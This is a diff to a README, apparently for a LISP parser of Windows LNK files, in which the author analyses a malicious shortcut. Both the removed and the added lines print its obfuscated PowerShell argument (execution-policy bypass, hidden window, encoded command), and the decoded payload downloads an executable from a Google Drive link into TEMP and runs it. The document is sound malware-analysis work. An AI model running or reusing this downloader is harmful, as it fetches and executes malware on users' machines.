@@ -1,14 +1,14 @@
 
 # Table of Contents
 
-1.  [Background](#orgf455823)
-2.  [Working with LISP Investigating Infected LNK File](#orga46f141)
-3.  [Quick Simple Report](#org945b9b5)
+1.  [Background](#orgc2d5e64)
+2.  [Investigating Infected LNK File with LISP](#org206a83d)
+3.  [Quick Simple Report](#org1c487ef)
 
 MS LNK binary file parser written in LISP.
 
 
-<a id="orgf455823"></a>
+<a id="orgc2d5e64"></a>
 
 # Background
 
@@ -19,9 +19,9 @@ The file in question was a Microsoft LNK file, which is a binary file ostensibly
 I couldn't find a good tool to look at the contents of a LNK file. Many tools, like Jacob Cunningham's lnk-parser and a few derivatives of his work, are outdated. However, Microsoft publicly publishes the specification in their publication "[MS-SHLLNK]: Shell Link (.LNK) Binary Format<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>" The specification is fairly well written and easy to understand.
 
 
-<a id="orga46f141"></a>
+<a id="org206a83d"></a>
 
-# Working with LISP Investigating Infected LNK File
+# Investigating Infected LNK File with LISP
 
 I had been looking for an opportunity to explore quick prototyping with LISP. The interactive REPL combined with the Emacs SLIME mode proved to be a useful combination to explore the binary file. I enjoyed the few hours I spent working on this.
 
@@ -55,24 +55,20 @@ After deciphering the header, I wrote a few functions to skip me to the string d
 
     (get-string-data *lnk*)
 
-    ((HASICONLOCATION . "C:\\Windows\\system32\\imageres.dll")
-     (HASARGUMENTS
-      . "cMd /c   PoweRshELL.EXe  -eX	BYpAsS 			-W	hiDdeN 		-ec	CQAMAAkAKAAJAAsACQBuAGUAVwAtAG8AQgBKAEUAYwB0ACAACwAgAFMAWQBzAHQAZQBtAC4AbgBlAFQALgBXAGUAYgBDAEwASQBlAG4AdAAJACAACQApAC4ARABPAHcATgBsAE8AYQBkAGYASQBMAEUAKAAJAAkACQAdIGgAdAB0AHAAcwA6AC8ALwBkAHIAaQB2AGUALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AdQBjAD8AZQB4AHAAbwByAHQAPQBkAG8AdwBuAGwAbwBhAGQAJgBpAGQAPQAxADkAZgBmAHcAYQBEAFMAQwBYAEgAQgBnAFMATQBMADgAagBqAE4AWAB0AF8ASgA2AHgASgBpADYAVgBNAFgAawAdIAkACwAgACwACQAgAAkAHSAkAEUATgB2ADoAdABFAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIAkACwAJACkACQAgAAkAOwAgAAwACQBJAG4AVgBPAEsAZQAtAEkAdABFAE0AIAAJACAAHSAkAEUATgBWADoAVABlAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIA==	 ")
-     (HASRELATIVEPATH
-      . "..\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
+    ((HASICONLOCATION . C:\Windows\system32\imageres.dll) (HASARGUMENTS . cMd /c   PoweRshELL.EXe  -eX	BYpAsS 			-W	hiDdeN 		-ec	CQAMAAkAKAAJAAsACQBuAGUAVwAtAG8AQgBKAEUAYwB0ACAACwAgAFMAWQBzAHQAZQBtAC4AbgBlAFQALgBXAGUAYgBDAEwASQBlAG4AdAAJACAACQApAC4ARABPAHcATgBsAE8AYQBkAGYASQBMAEUAKAAJAAkACQAdIGgAdAB0AHAAcwA6AC8ALwBkAHIAaQB2AGUALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AdQBjAD8AZQB4AHAAbwByAHQAPQBkAG8AdwBuAGwAbwBhAGQAJgBpAGQAPQAxADkAZgBmAHcAYQBEAFMAQwBYAEgAQgBnAFMATQBMADgAagBqAE4AWAB0AF8ASgA2AHgASgBpADYAVgBNAFgAawAdIAkACwAgACwACQAgAAkAHSAkAEUATgB2ADoAdABFAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIAkACwAJACkACQAgAAkAOwAgAAwACQBJAG4AVgBPAEsAZQAtAEkAdABFAE0AIAAJACAAHSAkAEUATgBWADoAVABlAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIA==	 ) (HASRELATIVEPATH . ..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe))
 
 The outdated Perl script did not return the entire string, clipping off most of the text behind "-ec", which is short for "-EncodedCommand", a way to send Base 64 text encoding. LISP has some good libraries that deal with Base 64 encoding and decoding, but this was a short exploratory exercise, and a LISP learning experience for me. I wrote a very basic function to look for "-ec" and then process the string immediately following, using a rudimentary Base 64 decoder.
 
     (get-cmd-argsb64 (cdr (assoc 'HasArguments (get-string-data *lnk*))))
 
-    "		(		neW-oBJEct  SYstem.neT.WebCLIent	 	).DOwNlOadfILE(			”https://drive.google.com/uc?export=download&id=19ffwaDSCXHBgSML8jjNXt_J6xJi6VMXk”	 ,	 	”$ENv:tEmP\\dmasddc.exe”		)	 	; 	InVOKe-ItEM 	 ”$ENV:TemP\\dmasddc.exe”"
+    		(		neW-oBJEct  SYstem.neT.WebCLIent	 	).DOwNlOadfILE(			”https://drive.google.com/uc?export=download&id=19ffwaDSCXHBgSML8jjNXt_J6xJi6VMXk”	 ,	 	”$ENv:tEmP\dmasddc.exe”		)	 	; 	InVOKe-ItEM 	 ”$ENV:TemP\dmasddc.exe”
 
 Here we have it! The LNK file is downloading an executable from Goggle Drive, renaming it to dmasddc.exe and running it. 
 
 It took only a few days for Google to block downloading of the executable file, after I flagged the file. he file is still there, but only down-loadable by the author; the Google drive error is "Sorry, this file is infected with a virus. Only the owner is allowed to download infected files." The original Zip file that contains the LNK file was also flagged, but it has not been blocked.
 
 
-<a id="org945b9b5"></a>
+<a id="org1c487ef"></a>
 
 # Quick Simple Report
 
